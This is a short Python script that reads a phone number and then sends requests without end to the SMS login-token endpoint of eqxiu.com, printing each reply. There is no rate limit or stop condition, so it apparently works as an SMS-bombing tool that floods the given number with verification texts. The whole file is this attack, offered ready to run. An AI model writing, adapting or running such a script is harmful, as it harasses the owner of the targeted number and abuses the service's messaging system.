import json
import requests
zxc=input('手机号')
header = {'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 Edg/93.0.961.38'}
while True:
    r=requests.get(url='https://passport.eqxiu.com/eqs/sms/token?phone='+zxc+'&type=quickLogin&checkPhone=1&channel=21&version=4.4.1',headers=header)
    print(r)
    print(json.loads(r.text)['msg'])